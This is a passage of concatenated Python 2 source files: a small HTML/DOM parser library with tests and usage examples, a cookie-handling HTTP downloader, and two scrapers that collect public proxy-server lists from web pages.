		if act == quote and unesc:
			output = output[:-1]

		output += act

		if act == "\\":
			unesc = not unesc
		else:
			unesc = False

	return output


def escape(input, quote = '"'):
	output = ""

	for c in input:
		if c == quote:
			output += '\\'

		output += c

	return output


def rotate_buff(buff):
	"Rotate buffer (for each buff[i] = buff[i-1])"
	i = len(buff) - 1
	while i > 0:
		buff[i] = buff[i - 1]
		i -= 1

	return buff


class SpecialDict(dict):
	"""
	This dictionary stores items case sensitive, but compare them case
	INsensitive.
	"""
	def __contains__(self, k):
		for item in super(SpecialDict, self).keys():
			if k.lower() == item.lower():
				return True

	def __getitem__(self, k):
		for item in self.keys():
			if k.lower() == item.lower():
				return super(SpecialDict, self).__getitem__(item)



class HTMLElement():
	"""
	Container for parsed html elements.
	"""

	def __init__(self, tag = "", second = None, third = None):
		self.__element = None
		self.__tagname = ""

		self.__istag        = False
		self.__isendtag     = False
		self.__iscomment    = False
		self.__isnonpairtag = False

		self.childs = []
		self.params = SpecialDict()
		self.endtag = None
		self.openertag = None

		# blah, constructor overloading in python sux :P
		if isinstance(tag, str) and second is None and third is None:
			self.__init_tag(tag)
		elif isinstance(tag, str) and isinstance(second, dict) and third is None:
			self.__init_tag_params(tag, second)
		elif isinstance(tag, str) and isinstance(second, dict) and     \
		     (isinstance(third, list) or isinstance(third, tuple)) and \
		     len(third) > 0 and isinstance(third[0], HTMLElement):

			# containers with childs are automatically considered tags
			if tag.strip() != "":
				if not tag.startswith("<"):
					tag = "<" + tag
				if not tag.endswith(">"):
					tag += ">"
			self.__init_tag_params(tag, second)
			self.childs = closeElements(third)
			self.endtag = HTMLElement("</" + self.getTagName() + ">")
		elif isinstance(tag, str) and (isinstance(second, list) or \
			 isinstance(second, tuple)) and len(second) > 0 and    \
			 isinstance(second[0], HTMLElement):

			# containers with childs are automatically considered tags
			if tag.strip() != "":
				if not tag.startswith("<"):
					tag = "<" + tag
				if not tag.endswith(">"):
					tag += ">"

			self.__init_tag(tag)
			self.childs = closeElements(second)
			self.endtag = HTMLElement("</" + self.getTagName() + ">")
		elif (isinstance(tag, list) or isinstance(tag, tuple)) and len(tag) > 0 \
		     and isinstance(tag[0], HTMLElement):
			self.__init_tag("")
			self.childs = closeElements(tag)
		else:
			raise Exception("Oh no, not this crap!")


	#===========================================================================
	#= Constructor overloading =================================================
	#===========================================================================
	def __init_tag(self, tag):
			self.__element = tag

			self.__parseIsTag()
			self.__parseIsComment()

			if (not self.__istag) or self.__iscomment:
				self.__tagname = self.__element
			else:
				self.__parseTagName()

			if self.__iscomment or not self.__istag:
				return

			self.__parseIsEndTag()
			self.__parseIsNonPairTag()

			if self.__istag and (not self.__isendtag) or "=" in self.__element:
				self.__parseParams()


	# used when HTMLElement(tag, params) is called - basically create string
	# from tagname and params
	def __init_tag_params(self, tag, params):
		tag = tag.strip().replace(" ", "")
		nonpair = ""

		if tag.startswith("<"):
			tag = tag[1:]

		if tag.endswith("/>"):
			tag = tag[:-2]
			nonpair = " /"
		elif tag.endswith(">"):
			tag = tag[:-1]

		output = "<" + tag

		for key in params.keys():
			output += " " + key + '="' + escape(params[key], '"') + '"'

		self.__init_tag(output + nonpair + ">")


	def find(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Same as findAll, but without endtags. You can always get them from
		.endtag property..
		"""

		dom = self.findAll(tag_name, params, fn, case_sensitive)

		return filter(lambda x: not x.isEndTag(), dom)


	def findB(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Same as findAllB, but without endtags. You can always get them from
		.endtag property..
		"""

		dom = self.findAllB(tag_name, params, fn, case_sensitive)

		return filter(lambda x: not x.isEndTag(), dom)


	def findAll(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Simple search engine using Depth-first algorithm
		http://en.wikipedia.org/wiki/Depth-first_search.

		Finds elements and subelements which match patterns given by parameters.
		Allows searching defined by users lambda function.

		@param tag_name: Name of tag.
		@type tag_name: string

		@param params: Parameters of arg.
		@type params: dictionary

		@param fn: User defined function for search.
		@type fn: lambda function

		@param case_sensitive: Search case sensitive. Default True.
		@type case_sensitive: bool

		@return: Matches.
		@rtype: Array of HTMLElements
		"""
		output = []

		if self.isAlmostEqual(tag_name, params, fn, case_sensitive):
			output.append(self)

		tmp = []
		for el in self.childs:
			tmp = el.findAll(tag_name, params, fn, case_sensitive)

			if tmp is not None and len(tmp) > 0:
				output.extend(tmp)

		return output


	def findAllB(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Simple search engine using Breadth-first algorithm
		http://en.wikipedia.org/wiki/Breadth-first_search.

		Finds elements and subelements which match patterns given by parameters.
		Allows searching defined by users lambda function.

		@param tag_name: Name of tag.
		@type tag_name: string

		@param params: Parameters of arg.
		@type params: dictionary

		@param fn: User defined function for search.
		@type fn: lambda function

		@param case_sensitive: Search case sensitive. Default True.
		@type case_sensitive: bool

		@return: Matches.
		@rtype: Array of HTMLElements
		"""
		output = []

		if self.isAlmostEqual(tag_name, params, fn, case_sensitive):
			output.append(self)

		breadth_search = self.childs
		for el in breadth_search:
			if el.isAlmostEqual(tag_name, params, fn, case_sensitive):
				output.append(el)

			if len(el.childs) > 0:
				breadth_search.extend(el.childs)

		return output


	#==========================================================================
	#= Parsers ================================================================
	#==========================================================================
	def __parseIsTag(self):
		if self.__element.startswith("<") and self.__element.endswith(">"):
			self.__istag = True
		else:
			self.__istag = False


	def __parseIsEndTag(self):
		last = ""
		self.__isendtag = False

		if self.__element.startswith("<") and self.__element.endswith(">"):
			for c in self.__element:
				if c == "/" and last == "<":
					self.__isendtag = True
				if ord(c) > 32:
					last = c


	def __parseIsNonPairTag(self):
		last = ""
		self.__isnonpairtag = False

		# Tags endings with /> are nonpair - do not mind whitespaces (< 32)
		if self.__element.startswith("<") and self.__element.endswith(">"):
			for c in self.__element:
				if c == ">" and last == "/":
					self.__isnonpairtag = True
					return
				if ord(c) > 32:
					last = c

		# Check listed nonpair tags
		if self.__tagname.lower() in NONPAIR_TAGS:
			self.__isnonpairtag = True


	def __parseIsComment(self):
		if self.__element.startswith("<!--") and self.__element.endswith("-->"):
			self.__iscomment = True
		else:
			self.__iscomment = False


	def __parseTagName(self):
		for el in self.__element.split(" "):
			el = el.replace("/", "").replace("<", "").replace(">", "")
			if len(el) > 0:
				self.__tagname = el.rstrip()
				return


	def __parseParams(self):
		# check if there are any parameters
		if " " not in self.__element or "=" not in self.__element:
			return

		# Remove '<' & '>'
		params = self.__element.strip()[1:-1].strip()
		# Remove tagname
		params = params[
			params.find(self.getTagName()) + len(self.getTagName()):
		].strip()

		# Parser machine
		next_state = 0
		key = ""
		value = ""
		end_quote = ""
		buff = ["", ""]
		for c in params:
			if next_state == 0:  # key
				if c.strip() != "":  # safer than list space, tab and all possible whitespaces in UTF
					if c == "=":
						next_state = 1
					else:
						key += c
			elif next_state == 1:  # value decisioner
				if c.strip() != "":  # skip whitespaces
					if c == "'" or c == '"':
						next_state = 3
						end_quote = c
					else:
						next_state = 2
						value += c
			elif next_state == 2:  # one word parameter without quotes
				if c.strip() == "":
					next_state = 0
					self.params[key] = value
					key = ""
					value = ""
				else:
					value += c
			elif next_state == 3:  # quoted string
				if c == end_quote and (buff[0] != "\\" or (buff[0]) == "\\" and buff[1] == "\\"):
					next_state = 0
					self.params[key] = unescape(value, end_quote)
					key = ""
					value = ""
					end_quote = ""
				else:
					value += c

			buff = rotate_buff(buff)
			buff[0] = c

		if key != "":
			if end_quote != "" and value.strip() != "":
				self.params[key] = unescape(value, end_quote)
			else:
				self.params[key] = value

		if len(filter(lambda x: x == "/", self.params.keys())) > 0:
			del self.params["/"]
			self.__isnonpairtag = True

	#* /Parsers ****************************************************************


	#===========================================================================
	#= Getters =================================================================
	#===========================================================================
	def isTag(self):
		"True if element is tag (not content)."
		return self.__istag


	def isEndTag(self):
		"True if HTMLElement is end tag (/tag)."
		return self.__isendtag


	def isNonPairTag(self, isnonpair = None):
		"""
		Returns True if HTMLElement is listed nonpair tag table (br for example)
		or if it ends with / - <br /> for example.

		You can also change state from pair to nonpair if you use this as setter.
		"""
		if isnonpair is None:
			return self.__isnonpairtag
		else:
			self.__isnonpairtag = isnonpair
			if not isnonpair:
				self.endtag = None
				self.childs = []


	def isPairTag(self):
		"""
		Return True if this is paired tag - <body> .. </body> for example.
		"""
		if self.isComment() or self.isNonPairTag:
			return False
		if self.isEndTag():
			return True
		if self.isOpeningTag() and self.endtag is not None:
			return True

		return False


	def isComment(self):
		"True if HTMLElement is html comment."
		return self.__iscomment


	def isOpeningTag(self):
		"True if is opening tag."
		if self.isTag() and (not self.isComment()) and (not self.isEndTag()) \
		   and (not self.isNonPairTag()):
			return True
		else:
			return False


	def isEndTagTo(self, opener):
		"Returns true, if this element is endtag to opener."
		if self.__isendtag and opener.isOpeningTag():
			if self.__tagname.lower() == opener.getTagName().lower():
				return True
			else:
				return False
		else:
			return False


	def tagToString(self):
		"Returns tag (with parameters), without content or endtag."
		if len(self.params) <= 0:
			return self.__element
		else:
			output = "<" + str(self.__tagname)

			for key in self.params.keys():
				output += " " + key + "=\"" + escape(self.params[key], '"') + "\""

			return output + " />" if self.__isnonpairtag else output + ">"


	def getTagName(self):
		"Returns tag name."
		return self.__tagname


	def getContent(self):
		"Returns content of tag (everything between opener and endtag)."
		output = ""

		for c in self.childs:
			if not c.isEndTag():
				output += c.toString()

		if output.endswith("\n"):
			output = output[:-1]

		return output


	def prettify(self, depth = 0, separator = "  ", last = True, pre = False, inline = False):
		"Returns prettifyied tag with content."
		output = ""

		if self.getTagName() != "" and self.tagToString().strip() == "":
			return ""

		# if not inside <pre> and not inline, shift tag to the right
		if not pre and not inline:
			output += (depth * separator)

		# for <pre> set 'pre' flag
		if self.getTagName().lower() == "pre" and self.isOpeningTag():
			pre = True
			separator = ""

		output += self.tagToString()

		# detect if inline
		is_inline = inline  # is_inline shows if inline was set by detection, or as parameter
		for c in self.childs:
			if not (c.isTag() or c.isComment()):
				if len(c.tagToString().strip()) != 0:
					inline = True

		# don't shift if inside container (containers have blank tagname)
		original_depth = depth
		if self.getTagName() != "":
			if not pre and not inline:  # inside <pre> doesn't shift tags
				depth += 1
				if self.tagToString().strip() != "":
					output += "\n"

		# prettify childs
		for e in self.childs:
			if not e.isEndTag():
				output += e.prettify(depth, last = False, pre = pre, inline = inline)

		# endtag
		if self.endtag is not None:
			if not pre and not inline:
				output += ((original_depth) * separator)

			output += self.endtag.tagToString().strip()

			if not is_inline:
				output += "\n"

		return output

	#* /Getters ****************************************************************


	#===========================================================================
	#= Operators ===============================================================
	#===========================================================================
	def toString(self, original = False):
		"""
		Returns almost original string (use original = True if you want exact copy).

		If you want prettified string, try .prettify()

		If original == True, return parsed element, so if you changed something
		in .params, there will be no traces of those changes.
		"""
		output = ""

		if self.childs != [] or self.isOpeningTag():
			output += self.__element if original else self.tagToString()

			for c in self.childs:
				output += c.toString(original)

			if self.endtag is not None:
				output += self.endtag.tagToString()
		elif not self.isEndTag():
			output += self.tagToString()

		return output


	def __str__(self):
		return self.toString()


	def isAlmostEqual(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Compare element with given tagname, params and/or by lambda function.

		Lambda function is same as in .find().
		"""

		if isinstance(tag_name, HTMLElement):
			return self.isAlmostEqual(tag_name.getTagName(), self.params)

		# search by lambda function
		if fn is not None:
			if fn(self):
				return True

		if not case_sensitive:
			self.__tagname = self.__tagname.lower()
			tag_name = tag_name.lower()

		# compare tagname
		if self.__tagname == tag_name and self.__tagname != "" and self.__tagname is not None:
			# compare parameters
			if params is None or len(params) == 0:
				return True
			elif len(self.params) > 0:
				for key in params.keys():
					if key not in self.params:
						return False
					elif params[key] != self.params[key]:
						return False

				return True

		return False

	#* /Operators **************************************************************


	#===========================================================================
	#= Setters =================================================================
	#===========================================================================
	def replaceWith(self, el):
		"""
		Replace element. Useful when you don't want change all references to object.
		"""
		self.childs = el.childs
		self.params = el.params
		self.endtag = el.endtag
		self.openertag = el.openertag

		self.__tagname = el.getTagName()
		self.__element = el.tagToString()

		self.__istag = el.isTag()
		self.__isendtag = el.isEndTag()
		self.__iscomment = el.isComment()
		self.__isnonpairtag = el.isNonPairTag()


	def removeChild(self, child, end_tag_too = True):
		"""
		Remove subelement (child) specified by reference.

		This can't be used for removing subelements by value! If you want do
		such thing, do:

		---
		for e in dom.find("value"):
			dom.removeChild(e)
		---

		Params:
			child
				child which will be removed from dom (compared by reference)
			end_tag_too
				remove end tag too - default true
		"""

		if len(self.childs) <= 0:
			return

		end_tag = None
		if end_tag_too:
			end_tag = child.endtag

		for e in self.childs:
			if e == child:
				self.childs.remove(e)
			if end_tag_too and end_tag == e and end_tag is not None:
				self.childs.remove(e)
			else:
				e.removeChild(child, end_tag_too)

	#* /Setters ****************************************************************



def closeElements(childs):
	"Close tags - used in some constructors"

	o = []

	# Close all unclosed pair tags
	for e in childs:
		if e.isTag():
			if not e.isNonPairTag() and not e.isEndTag() and not e.isComment() and e.endtag is None:
				e.childs = closeElements(e.childs)

				o.append(e)
				o.append(HTMLElement("</" + e.getTagName() + ">"))

				# Join opener and endtag
				e.endtag = o[-1]
				o[-1].openertag = e
			else:
				o.append(e)
		else:
			o.append(e)

	return o



def __raw_split(itxt):
	"""
	Parse HTML from text into array filled with tags end text.

	Source code is little bit unintutive, because it is simple parser machine.
	For better understanding, look at;
	http://kitakitsune.org/images/field_parser.png
	"""
	echr = ""
	buff = ["", "", "", ""]
	content = ""
	array = []
	next_state = 0
	inside_tag = False

	for c in itxt:
		if next_state == 0:  # content
			if c == "<":
				if len(content) > 0:
					array.append(content)
				content = c
				next_state = 1
				inside_tag = False
			else:
				content += c
		elif next_state == 1:  # html tag
			if c == ">":
				array.append(content + c)
				content = ""
				next_state = 0
			elif c == "'" or c == '"':
				echr = c
				content += c
				next_state = 2
			elif c == "-" and buff[0] == "-" and buff[1] == "!" and buff[2] == "<":
				if len(content[:-3]) > 0:
					array.append(content[:-3])
				content = content[-3:] + c
				next_state = 3
			else:
				if c == "<":  # jump back into tag instead of content
					inside_tag = True
				content += c
		elif next_state == 2:  # "" / ''
			if c == echr and (buff[0] != "\\" or (buff[0] == "\\" and buff[1] == "\\")):
				next_state = 1
			content += c
		elif next_state == 3:  # html comments
			if c == ">" and buff[0] == "-" and buff[1] == "-":
				if inside_tag:
					next_state = 1
				else:
					next_state = 0
				inside_tag = False

				array.append(content + c)
				content = ""
			else:
				content += c

		# rotate buffer
		buff = rotate_buff(buff)
		buff[0] = c

	if len(content) > 0:
		array.append(content)

	return array



def __repair_tags(raw_input):
	"""
	Repair tags with comments (<HT<!-- asad -->ML> is parsed to
	["<HT", "<!-- asad -->", "ML>"]	and I need ["<HTML>", "<!-- asad -->"])
	"""
	ostack = []

	index = 0
	while index < len(raw_input):
		el = raw_input[index]

		if el.isComment():
			if index > 0 and index < len(raw_input) - 1:
				if raw_input[index - 1].tagToString().startswith("<") and raw_input[index + 1].tagToString().endswith(">"):
					ostack[-1] = HTMLElement(ostack[-1].tagToString() + raw_input[index + 1].tagToString())
					ostack.append(el)
					index += 1
					continue

		ostack.append(el)

		index += 1

	return ostack



def __indexOfEndTag(istack):
	"""
	Go through istack and search endtag. Element at first index is considered as
	opening tag.

	Returns: index of end tag or 0 if not found.
	"""
	if len(istack) <= 0:
		return 0

	if not istack[0].isOpeningTag():
		return 0

	opener = istack[0]
	cnt = 0

	index = 0
	for el in istack[1:]:
		if el.isOpeningTag() and (el.getTagName().lower() == opener.getTagName().lower()):
			cnt += 1
		elif el.isEndTagTo(opener):
			if cnt == 0:
				return index + 1
			else:
				cnt -= 1

		index += 1

	return 0



def __parseDOM(istack):
	"Recursively go through element array and create DOM."
	ostack = []
	end_tag_index = 0

	index = 0
	while index < len(istack):
		el = istack[index]

		end_tag_index = __indexOfEndTag(istack[index:])  # Check if this is pair tag

		if not el.isNonPairTag() and end_tag_index == 0 and not el.isEndTag():
			el.isNonPairTag(True)

		if end_tag_index != 0:
			el.childs = __parseDOM(istack[index + 1: end_tag_index + index])
			el.endtag = istack[end_tag_index + index]  # Reference to endtag
			el.endtag.openertag = el
			ostack.append(el)
			ostack.append(el.endtag)
			index = end_tag_index + index
		else:
			if not el.isEndTag():
				ostack.append(el)

		index += 1

	return ostack



def parseString(txt):
	"""
	Parse given string and return DOM tree consisting of single linked
	HTMLElements.
	"""
	istack = []

	# remove UTF BOM (prettify fails if not)
	if len(txt) > 3 and txt.startswith("\xef\xbb\xbf"):
		txt = txt[3:]

	for el in __raw_split(txt):
		istack.append(HTMLElement(el))

	container = HTMLElement()
	container.childs = __parseDOM(__repair_tags(istack))

	return container



def makeDoubleLinked(dom, parent = None):
	"""
	Standard output from dhtmlparser is single-linked tree. This will make it 
	double-linked.
	"""
	dom.parent = parent

	if len(dom.childs) > 0:
		for child in dom.childs:
			child.parent = dom
			makeDoubleLinked(child, dom)



#==============================================================================
#= Main program ===============================================================
#==============================================================================
if __name__ == "__main__":
	print "Testing.."

	assert unescape(r"""\' \\ \" \n""")      == r"""\' \\ " \n"""
	assert unescape(r"""\' \\ \" \n""", "'") == r"""' \\ \" \n"""
	assert unescape(r"""\' \\" \n""")        == r"""\' \\" \n"""
	assert unescape(r"""\' \\" \n""")        == r"""\' \\" \n"""
	assert unescape(r"""printf(\"hello \t world\");""") == r"""printf("hello \t world");"""

	assert escape(r"""printf("hello world");""") == r"""printf(\"hello world\");"""
	assert escape(r"""'""", "'") == r"""\'"""

	dom = parseString("""
		"<div Id='xe' a='b'>obsah xe divu</div> <!-- Id, not id :) -->
		 <div id='xu' a='b'>obsah xu divu</div>
	""")

	# find test
	divXe = dom.find("div", {"id":"xe"})[0]
	divXu = dom.find("div", {"id":"xu"})[0]

	# assert divXe.tagToString() == """<div a="b" id="xe">"""
	# assert divXu.tagToString() == """<div a="b" id="xu">"""

	# unit test for toString
	assert divXe.toString() == """<div a="b" Id="xe">obsah xe divu</div>"""
	assert divXu.toString() == """<div a="b" id="xu">obsah xu divu</div>"""

	# getTagName() test
	assert divXe.getTagName() == "div"
	assert divXu.getTagName() == "div"

	# isComment() test
	assert divXe.isComment() == False
	assert divXe.isComment() == divXu.isComment()

	assert divXe.isNonPairTag() != divXe.isOpeningTag()

	assert divXe.isTag() is True
	assert divXe.isTag() == divXu.isTag()

	assert divXe.getContent() == "obsah xe divu"

	# find()/findB() test
	dom = parseString("""
		<div id=first>
			First div.
			<div id=first.subdiv>
				Subdiv in first div.
			</div>
		</div>
		<div id=second>
			Second.
		</div>
	""")

	assert dom.find("div")[1].getContent().strip() == "Subdiv in first div."
	assert dom.findB("div")[1].getContent().strip() == "Second."

	print "Everything ok."
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
import dhtmlparser as d

s = """
<root>
	<object1>Content of first object</object1>
	<object2>Second objects content</object2>
</root>
"""

dom = d.parseString(s)

print dom
print "---\nRemove all <object1>:\n---\n"

# remove all <object1>
for e in dom.find("object1"):
	dom.removeChild(e)


print dom.prettify()


#* Prints: *********************************************************************
"""
<root>
	<object1>Content of first object</object1>
	<object2>Second objects content</object2>
</root>

---
Remove all <object1>:
---

<root>
  <object2>Second objects content</object2>
</root>
"""
#*******************************************************************************#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
from dhtmlparser import *

# if inside container (or other tag), create endtag automatically
print HTMLElement([
	HTMLElement("<xe>")
])
"""
Writes:

<xe>
</xe>
"""

#-------------------------------------------------------------------------------

# if not inside container, elements are left unclosed 
print HTMLElement("<xe>")
"""
Writes only:

<xe>
"""#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
DHTMLParserPy example how to find every link in document.
"""

import urllib
import dhtmlparser

f = urllib.urlopen("http://google.com")
data = f.read()
f.close()

dom = dhtmlparser.parseString(data)

for link in dom.find("a"):
	if "href" in link.params:
		print link.params["href"]#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
from dhtmlparser import *

foo = HTMLElement("<xe one='param'>")
baz = HTMLElement('<xe one="param">')

assert foo != baz # references are not the same
assert foo.isAlmostEqual(baz)#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# DHTMLParser DOM creation example.
from dhtmlparser import *

e = HTMLElement("root", [
		HTMLElement("item", {"param1":"1", "param2":"2"}, [
			HTMLElement("<crap>", [
				HTMLElement("hello parser!")
			]),
			HTMLElement("<another_crap/>", {"with" : "params"}),
			HTMLElement("<!-- comment -->")
		]),
		HTMLElement("<item />", {"blank" : "body"})
	])

print e.prettify()

"""
Writes:

<root>
  <item param2="2" param1="1">
    <crap>hello parser!</crap>
    <another_crap with="params" />
    <!-- comment -->
  </item>
  <item blank="body" />
</root>
"""
#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""
Proxy parser for http://www.ip-adress.com.

by Bystroushaak bystrousak@kitakitsune.org
"""
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import httpkie
import dhtmlparser



#= Functions & objects ========================================================
def getProxies():
	"""
	Return array of dicts following this structure:
	{
		ip: str(ip),
		port: int(port),
		type: str(Elite/Anonymous/etc..),
		country: str(country_name),
		ping: -1 # yeah, there is no ping information, this is just for compatibility
	}
	"""
	down = httpkie.Downloader()
	down.headers["Referer"] = "http://www.ip-adress.com/proxy_list/"

	dom = dhtmlparser.parseString(
		down.download("http://www.ip-adress.com/proxy_list/")
	)

	proxies = []
	for tr in dom.find("table", {"class": "proxylist"})[0].find("tr")[2:-1]:
		ip, port = tr.find("td")[0].getContent().split(":")
		proxy_type = tr.find("td")[1].getContent()

		country = tr.find("td")[2]
		country.find("img")[0].replaceWith(dhtmlparser.HTMLElement(""))
		country = country.getContent().strip()

		proxies.append({
			"ip": ip,
			"port": int(port),
			"type": proxy_type,
			"country": country,
			"ping": -1
		})

	return proxies



#= Main program ===============================================================
if __name__ == '__main__':
	import json
	print json.dumps(getProxies())
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Easy to use downloader library based on urllib/urllib2
by Bystroushaak (bystrousak@kitakitsune.org)

This work is licensed under a Creative Commons Licence
(http://creativecommons.org/licenses/by/3.0/cz/).
"""
# Imports =====================================================================
import urllib
import urllib2



# Variables ===================================================================
# IE 7/Windows XP headers.
IEHeaders = {
	"User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
	"Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
	"Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
	"Accept-Charset": "utf-8",
	"Keep-Alive": "300",
	"Connection": "keep-alive",
}
# Linux ubuntu x86_64 Firefox 23 headers
LFFHeaders = {
	"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:23.0) Gecko/20100101 Firefox/23.0",
	"Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
	"Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
	"Accept-Charset": "utf-8",
	"Keep-Alive": "300",
	"Connection": "keep-alive",
}



#= Functions & objects ========================================================
class Downloader():
	"""
	Lightweight class utilizing downloads from internet.

	Main method: .download()

	Important properties:
		.headers
		.response_headers
		.cookies
		.handle_cookies
	"""

	def __init__(self, headers = None, handle_cookies = True, http_proxy = None):
		"""
		You can set:

		headers -- default IEHeaders, but there is also LFFHeaders
		handle_cookies -- set to false if you don't wish to automatically handle cookies
		http_proxy -- 'url:port' describing HTTP proxy
		"""
		self.headers = headers if headers is not None else IEHeaders
		self.response_headers = None

		self.cookies = {}
		self.handle_cookies = True

		self.http_proxy = None
		if http_proxy is not None:
			self.http_proxy = {'http': http_proxy}


	def download(self, url, get = None, post = None, head = None):
		"""
		Parameters:
		url -- set url to download, automatically adds htt:// if not present
		get -- dict with GET parameters 
		post -- dict with POST parameters
		head -- set to True if you wish to use HEAD request. Returns headers from
		server.
		"""
		# POST params
		if post is not None:
			if type(post) != dict:
				raise TypeError("Unknown type of post paramters.")
			post = urllib.urlencode(post)

		# append GET params to url
		if get is not None:
			if type(get) != dict:
				raise TypeError("Unknown type of get paramters.")
			get = urllib.urlencode(get)
			if "?" in url:
				if url[-1] == "&":
					url += get
				else:
					url += "&" + get
			else:
				url += "?" + get

			get = None

		# check if protocol is specified in |url|
		if not "://" in url:
			url = "http://" + url

		if self.handle_cookies:
			self.__setCookies(url)

		# HEAD request support
		url_req = urllib2.Request(url, post, self.headers)
		if head is not None:
			url_req.get_method = lambda: "HEAD"

		# http proxy support
		opener = None
		if self.http_proxy is None:
			opener = urllib2.build_opener()
		else:
			opener = urllib2.build_opener(urllib2.ProxyHandler(self.http_proxy))

		# download page and save headers from server
		f = opener.open(url_req)
		data = f.read()
		self.response_headers = f.info().items()
		f.close()

		if self.handle_cookies:
			self.__readCookies(url)

		# i suppose I could fix __readCookies() to use dict, but .. meh
		self.response_headers = dict(self.response_headers)

		# head doesn't have content, so return just response headers
		if head is not None:
			return self.response_headers

		return data


	def __setCookies(self, url):
		# add cokies into headers
		domain = self.__getDomain(url)
		if domain in self.cookies.keys():
			cookie_string = ""
			for key in self.cookies[domain].keys():
				cookie_string += key + "=" + str(self.cookies[domain][key]) + "; "

			self.headers["Cookie"] = cookie_string.strip()


	def __readCookies(self, url):
		# simple (and lame) cookie handling
		# parse "set-cookie" string
		cookie_string = ""
		for c in self.response_headers:
			if c[0].lower() == "set-cookie":
				cookie_string = c[1]

		# parse keyword:values
		tmp_cookies = {}
		for c in cookie_string.split(","):
			cookie = c
			if ";" in c:
				cookie = c.split(";")[0]
			cookie = cookie.strip()

			cookie = cookie.split("=")
			keyword = cookie[0]
			value = "=".join(cookie[1:])

			tmp_cookies[keyword] = value

		# append global variable cookis with new cookies
		if len(tmp_cookies) > 0:
			domain = self.__getDomain(url)

			if domain in self.cookies.keys():
				for key in tmp_cookies.keys():
					self.cookies[domain][key] = tmp_cookies[key]
			else:
				self.cookies[domain] = tmp_cookies

		# check for blank cookies
		if len(self.cookies) > 0:
			for domain in self.cookies.keys():
				for key in self.cookies[domain].keys():
					if self.cookies[domain][key].strip() == "":
						del self.cookies[domain][key]

				if len(self.cookies[domain]) == 0:
					del self.cookies[domain]


	def __getDomain(self, url):
		"""
		Parse domain from url.
		"""
		if "://" in url:
			url = url.split("://")[1]

		if "/" in url:
			url = url.split("/")[0]

		return url
# -*- coding: utf-8 -*-
# This file is there mainly for 'git submodule' use in other projects.

from httpkie import *#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""
Proxy parser for http://hidemyass.com/proxy-list/.

by Bystroushaak bystrousak@kitakitsune.org
"""
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import httpkie
import dhtmlparser as d



#= Variables ==================================================================
_POST_DATA = {
	"ac": "on",
	"c[]": "Netherlands",
	"p": "",
	"pr[]": "0",
	"a[]": "4",
	"pl": "on",
	"sp[]": "3",
	"ct[]": "3",
	"s": "0",
	"o": "0",
	"pp": "1",
	"sortBy": "date",
}



#= Functions & objects ========================================================
def __cleanThatShit(shit):
	visible = []

	# find all styles and parse visible class atributes
	for el in shit.find("", fn = lambda x: x.isTag()):
		styles = el.find("style")
		if len(styles) >= 1:
			style_string = ""
			for style in styles:
				style_string += style.getContent() + "\n"
				style.replaceWith(d.parseString(""))
			styles = map(lambda x: x.strip(), style_string.splitlines())
			styles = filter(lambda x: len(x) > 0 and "none" not in x, styles)
			visible += map(lambda x: x[1:].split("{")[0], styles)

	# remove invisible elements
	for el in shit.find("", fn = lambda x: x.isTag()):
		# remove display:none elements
		if "style" in el.params and "none" in el.params["style"]:
			el.replaceWith(d.parseString(""))

		# remove elements with invisible styles
		if "class" in el.params:
			if not el.params["class"].isdigit() and el.params["class"] not in visible:
				el.replaceWith(d.parseString(""))

	return shit


def __shitToIP(shit):
	shit = str(shit)

	content = ""
	for crap in shit.split(">"):
		crap = crap.split("<")[0]

		if crap == ".":
			content += "."
			continue

		if crap.isdigit() or crap.replace(".", "").isdigit():
			content += crap

	return content



def __getProxies(pp):
	down = httpkie.Downloader()

	_POST_DATA["pp"] = pp

	dom = d.parseString(
		down.download(
			"http://hidemyass.com/proxy-list/search-231187",
			post = _POST_DATA
		)
	)


	proxies = []
	for tr in dom.find("table")[0].find("tr")[1:]:
		country = tr.find("td")[3].find("span")[0].getContent()
		country = country.split("/>")[-1].strip()

		proxy = {
			"ip": __shitToIP(__cleanThatShit(tr.find("td")[1])),
			"port": tr.find("td")[2].getContent().strip(),
			"ping": int(tr.find("td")[5].find("div")[0].params["rel"]),
			"country": country
		}

		proxies.append(proxy)

	return proxies


def getProxies():
	"""
	Return array of dicts following this structure:
	{
		ip: str(ip),
		port: int(port),
		country: str(country_name),
		ping: int(something numeric, but probably not exactly milliseconds)
	}
	"""
	return __getProxies(1) + __getProxies(3)


#= Main program ===============================================================
if __name__ == '__main__':
	import json
	print json.dumps(getProxies())
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Easy to use downloader library based on urllib/urllib2
by Bystroushaak (bystrousak@kitakitsune.org)

This work is licensed under a Creative Commons Licence
(http://creativecommons.org/licenses/by/3.0/cz/).
"""
# Imports =====================================================================
import urllib
import urllib2



# Variables ===================================================================
# IE 7/Windows XP headers.
IEHeaders = {
	"User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
	"Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
	"Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
	"Accept-Charset": "utf-8",
	"Keep-Alive": "300",
	"Connection": "keep-alive",
}
# Linux ubuntu x86_64 Firefox 23 headers
LFFHeaders = {
